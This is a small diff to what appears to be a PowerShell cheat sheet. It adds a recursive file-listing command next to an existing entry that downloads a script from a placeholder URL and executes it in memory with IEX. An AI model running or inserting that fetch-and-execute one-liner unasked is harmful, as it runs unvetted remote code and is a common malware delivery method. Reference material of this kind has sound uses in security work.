@@ -10,3 +10,6 @@
 
 # Execute powershell in memory
 `(New-Object Net.WebClient).DownloadString('<URL>') | IEX`
+
+# Get files only in a directory
+`(ls -File -Recurse -Force -EA SilentlyContinue).fullname`
